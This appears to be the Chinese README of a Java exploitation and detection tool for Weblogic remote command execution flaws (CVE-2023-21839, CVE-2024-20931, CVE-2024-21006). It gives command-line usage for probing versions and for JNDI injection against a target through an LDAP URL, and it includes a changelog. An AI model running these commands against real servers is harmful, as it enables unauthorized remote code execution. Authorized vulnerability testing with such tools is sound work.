# Getting Started

jar包见releases;

### 功能简介

#### 1. 命令详情介绍

```bash
命令说明：
-h :查看所有命令详情
-l :查看所有支持检测的漏洞列表
-bList :查看所有支持批量检测的漏洞列表
-sVersion :精确扫描目标版本，已支持,
			Weblogic:
            Usage: java -jar xx.jar -sVersion <targetIp> <TargetPort>
jndi使用说明:
			Usage: java -jar xx.jar <cveId> <targetIp> <targetPort> <ldapUrl>

```



#### 2. 支持检测的漏洞列表

```ABAP
Weblogic:
CVE-2023-21839：Weblogic JNDI注入远程命令执行漏洞
CVE-2024-20931：基于CVE-2023-21839绕过，JNDI远程命令执行漏洞
CVE-2024-21006：Weblogic JNDI远程命令执行漏洞

Struts2:

暂无;
```



#### 3.已支持的批量检测

```ABAP
Weblogic:
暂无

Struts2:
暂无

```



### 更新记录



#### 20240723

**新增：**

weblogic 单目标漏洞批量检测，

`java -jar javaRce.jar -weblogic targetIP targetPort ldapUrl`




#### 20240722
**新增：**

> 1. Weblogic Server版本精确探测；



#### 20240719
**新增：**

> 1. CVE-2024-20931：基于CVE-2023-21839绕过，JNDI远程命令执行漏洞；

